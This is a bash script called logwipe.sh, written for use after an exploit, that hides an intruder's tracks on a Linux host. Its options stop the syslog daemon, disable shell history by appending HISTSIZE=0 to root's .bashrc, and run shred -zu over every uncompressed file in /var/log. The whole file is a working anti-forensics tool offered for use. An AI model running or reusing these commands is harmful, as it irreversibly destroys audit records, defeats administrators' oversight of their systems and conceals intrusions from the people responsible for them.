#!/bin/bash

# Set colors
red=$(tput setaf 1)
green=$(tput setaf 2)
reset=$(tput sgr0)

# Script for wiping log files
while getopts ":hsHl" arg;
	do
        case "${arg}" in
                # Take out remote logging
                s )
                  SYSLOGINIT=`/usr/bin/find /etc/init.d -name *syslog*`
                  /bin/bash $SYSLOGINIT stop
                  echo "$green Syslog daemon Stopped $reset"
                ;;
                # Sort out history
                H )
                  export HISTSIZE="0"
		  echo HISTSIZE=0>>/root/.bashrc
                  echo "$green History stopped and wiped $reset"
                ;;
                # Take out the recent log files if run post exploit otherwise leave
                l )
                  for log in `/usr/bin/find -H /var/log -type f | grep -v gz`; do 
			  shred -zu $log
			  done
                  echo "$green Recent logs wiped $reset"
                ;;
		# usage info
                * )
                  echo "Usage: logwipe.sh -hsHl"
                  echo "-h - This help message"
                  echo "-s - Shut down syslog daemon"
                  echo "-H - Wipe history and stop history function"
                  echo "-l - Wipe recent log files"
		  exit 0
                ;;
        	esac
	done
	
